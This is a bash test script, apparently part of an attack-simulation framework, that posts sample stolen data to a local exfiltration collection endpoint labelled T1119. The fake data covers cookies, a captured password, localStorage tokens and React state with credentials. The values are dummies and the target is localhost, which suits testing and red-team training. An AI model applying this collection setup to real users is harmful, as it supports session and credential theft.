#!/bin/bash
# Test script for the collect.js endpoint
# This script demonstrates how to send data to the collection endpoint using curl

# Set the base URL (assuming the server is running locally on port 3000)
BASE_URL="http://localhost:3000"

# Set colors for better output visibility
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${YELLOW}Testing the collect.js endpoint${NC}"
echo "======================================"
echo ""

# Test 1: Simple cookies exfiltration
echo -e "${GREEN}Test 1: Cookies exfiltration${NC}"
curl -v -X POST \
  "${BASE_URL}/attcks/T1119/collect" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
  -d '{
    "cookies": "session=abcd1234; auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; theme=dark",
    "url": "https://example.com/dashboard"
  }'
echo ""
echo ""

# Test 2: Form data exfiltration
echo -e "${GREEN}Test 2: Form data exfiltration${NC}"
curl -v -X POST \
  "${BASE_URL}/attcks/T1119/collect" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" \
  -d '{
    "inputName": "password",
    "inputType": "password",
    "value": "SecretP@ssw0rd123!",
    "url": "https://example.com/login"
  }'
echo ""
echo ""

# Test 3: LocalStorage exfiltration
echo -e "${GREEN}Test 3: LocalStorage exfiltration${NC}"
curl -v -X POST \
  "${BASE_URL}/attcks/T1119/collect" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" \
  -d '{
    "localStorage": {
      "user_id": "12345",
      "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
      "preferences": "{\"theme\":\"dark\",\"notifications\":true}"
    },
    "url": "https://example.com/account"
  }'
echo ""
echo ""

# Test 4: React state exfiltration
echo -e "${GREEN}Test 4: React state exfiltration${NC}"
curl -v -X POST \
  "${BASE_URL}/attcks/T1119/collect" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
  -d '{
    "reactStates": [
      {
        "componentName": "LoginForm",
        "state": {
          "username": "admin",
          "password": "admin123",
          "rememberMe": true,
          "isSubmitting": false
        }
      },
      {
        "componentName": "Dashboard",
        "state": {
          "user": {
            "id": "usr_123456",
            "name": "Admin User",
            "role": "administrator",
            "email": "admin@example.com"
          },
          "notifications": [
            {"id": 1, "message": "New message from user"},
            {"id": 2, "message": "System update required"}
          ]
        }
      }
    ],
    "url": "https://example.com/dashboard"
  }'
echo ""
echo ""

# Test 5: Request with the health check endpoint
echo -e "${GREEN}Test 5: Health check endpoint${NC}"
curl -v -X GET "${BASE_URL}/attcks/T1119/health"
echo ""
echo ""

echo -e "${YELLOW}All tests completed${NC}"
echo "To check the logs, examine the files in the logs directory:"
echo "  - ./logs/access.log - For HTTP access logs"
echo "  - ./logs/data_YYYYMMDD.json - For the collected data"
echo ""
echo "Example commands to view logs:"
echo "  cat ./logs/access.log"
echo "  cat ./logs/data_$(date +%Y%m%d).json"
